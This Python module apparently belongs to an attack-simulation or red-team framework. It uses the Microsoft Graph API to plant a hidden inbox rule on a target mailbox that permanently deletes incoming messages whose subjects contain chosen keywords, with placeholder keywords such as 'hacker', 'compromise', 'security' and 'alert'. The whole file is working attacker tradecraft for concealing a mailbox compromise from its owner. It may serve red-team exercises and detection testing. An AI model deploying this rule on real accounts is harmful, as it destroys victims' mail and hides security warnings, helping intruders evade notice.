from core.GraphFunctions import graph_post_request

def TechniqueMain(keywords, user_id):
    '''
    Description: Setup email deletion rule on a users mailbox
    Privileges: MailboxSettings.ReadWrite
    '''

    '''Break input string into a list for graph input'''
    keywords = keywords.split(",")
    '''Remove any leading or trailing spaces from input'''
    for i,words in enumerate(keywords):
        keywords[i] = words.strip()

    endpoint_url = f"https://graph.microsoft.com/v1.0/users/{user_id}/mailFolders/inbox/messageRules"
    data = {
        "displayName": "ProjectV Rule",
        "sequence": 1,
        "isEnabled": "true", 
        "conditions": {
            "sentToMe": "true",
            "subjectContains": keywords
        },
        "actions": {
            "permanentDelete": 'true',
            "stopProcessingRules": 'true'
        }
    }

    deletion_rule = graph_post_request(url = endpoint_url, data = data)

    return deletion_rule

def TechniqueInputSrc() -> list:
    '''Returns the input fields required as parameters for the technique execution'''
    return [
        {"title" : "Mailbox Address", "id" : "mail-deletion-config-mailbox-addr-text-input", "type" : "email", "placeholder" : "user@corp.com", "element_type" : "dcc.Input"},
        {"title" : "Deletion Rule Keywords", "id" : "mail-deletion-config-keywords-text-input", "type" : "text", "placeholder" : "hacker, compromise, security, alert", "element_type" : "dcc.Input"}
    ]